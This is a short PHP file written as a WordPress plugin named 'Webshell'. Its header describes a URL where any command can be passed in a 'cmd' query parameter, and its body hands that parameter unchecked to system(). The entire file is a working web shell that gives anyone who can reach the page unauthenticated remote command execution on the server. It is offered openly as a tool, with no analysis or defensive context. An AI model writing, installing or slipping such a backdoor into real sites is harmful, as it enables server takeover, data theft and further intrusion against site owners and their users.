<?php
/**
* Plugin Name: Webshell
* Description: Webshell available at /wp-content/plugins/webshell/webshell.php?cmd=[your command]
* Author: N. Trudore
* License: MIT
*/
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

